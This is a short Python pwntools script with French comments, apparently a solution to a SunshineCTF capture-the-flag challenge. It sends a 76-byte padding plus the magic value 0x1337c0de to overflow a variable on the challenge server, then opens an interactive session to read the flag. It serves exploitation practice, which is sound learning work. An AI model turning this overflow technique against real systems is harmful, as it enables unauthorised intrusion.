from pwn import *

# Cible le binaire local
p = remote('chal.sunshinectf.games', 25601)

# L'offset pour atteindre la variable est de 76 octets
offset = 76

# La valeur magique à écrire.
# On utilise p32() car les instructions movl/cmpl travaillent sur 32 bits (4 octets).
magic_value = p32(0x1337c0de)

# On forge le payload
payload = b'A' * offset + magic_value

# On attend le prompt
p.recvuntil(b':')

# On envoie notre payload pour ouvrir la porte dérobée
p.sendline(payload)

# On savoure le flag
p.interactive()